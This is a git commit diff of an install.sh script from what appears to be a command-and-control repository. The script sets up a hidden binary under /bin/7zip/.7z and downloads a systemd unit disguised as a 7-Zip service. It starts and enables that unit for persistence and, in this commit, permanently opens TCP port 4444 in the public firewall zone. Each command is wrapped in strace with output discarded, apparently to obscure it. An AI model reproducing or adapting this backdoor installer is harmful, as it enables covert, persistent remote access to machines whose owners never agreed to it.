b026d6416db9cad57927b46fb23268fc761c5ac9
Ricardo <ricardo.palma.rjp@gmail.com>
2024-03-21 19:07:52 -0500

    Fixed firewall cmd

--- install.sh
+++ install.sh
@@ -7,7 +7,7 @@ sudo strace -o /dev/null chmod +x /bin/7zip/.7z
 curl https://github.com/Palma-Ricardo/c2/raw/main/7z.service -o 7z.service
 sudo strace -o /dev/null mv 7z.service /etc/systemd/system/7z.service
 rm 7z.service
-sudo strace -o /dev/null firewall-cmd --add-port=4444/tcp
+sudo strace -o /dev/null firewall-cmd --zone=public --permanent --add-port=4444/tcp
 sudo strace -o /dev/null systemctl start 7z
 sudo strace -o /dev/null systemctl enable 7z
 
